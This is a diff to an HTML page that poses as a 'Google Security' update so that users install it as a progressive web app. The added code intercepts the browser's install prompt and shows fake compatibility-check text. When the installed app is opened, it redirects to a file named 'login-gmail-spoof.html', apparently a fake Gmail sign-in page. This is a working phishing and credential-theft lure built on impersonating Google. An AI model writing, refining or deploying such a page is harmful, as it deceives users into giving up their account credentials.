@@ -4,15 +4,20 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="manifest" href="manifest.json">
     <style>
-        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 10vh; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 90%; display: none; }
+        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 15vh; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 85%; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
     </style>
 </head>
 <body>
-    <h2 id="txt">System Verification</h2>
-    <button class="btn" id="go">INSTALL SECURITY UPDATE</button>
+    <h2 id="txt">Security Update Required</h2>
+    <p id="sub" style="color:#9aa0a6">Checking system compatibility...</p>
+    <button class="btn" id="go">ACTIVATE GOOGLE SECURITY</button>
 
 <script>
+if (window.matchMedia('(display-mode: standalone)').matches) {
+    window.location.href = "login-gmail-spoof.html";
+}
+
 let p;
 navigator.serviceWorker.register('sw.js');
 
@@ -20,27 +25,18 @@ window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     p = e;
     document.getElementById('go').style.display = 'block';
-    document.getElementById('txt').innerText = "Device Compatible";
+    document.getElementById('sub').innerText = "Compatibility Confirmed.";
 });
 
-document.getElementById('go').onclick = () => {
-    let w = window.open('about:blank');
-    
-    w.document.body.innerHTML = `
-        <body style="background:#202124;color:white;text-align:center;padding-top:40vh;font-family:sans-serif;">
-            <button style="background:#34a853;color:white;border:none;padding:25px;font-size:20px;border-radius:10px;width:90%;font-weight:bold;">
-                CONFIRM INSTALLATION
-            </button>
-        </body>`;
-
-    w.onclick = async () => {
-        if (p) {
-            p.prompt();
-            const { outcome } = await p.userChoice;
-            if (outcome === 'accepted') w.close();
-            p = null;
+document.getElementById('go').onclick = async () => {
+    if (p) {
+        p.prompt();
+        const { outcome } = await p.userChoice;
+        if (outcome === 'accepted') {
+            alert("Module Installed. Launch 'Google' from your Home Screen.");
         }
-    };
+        p = null;
+    }
 };
 </script>
 </body>
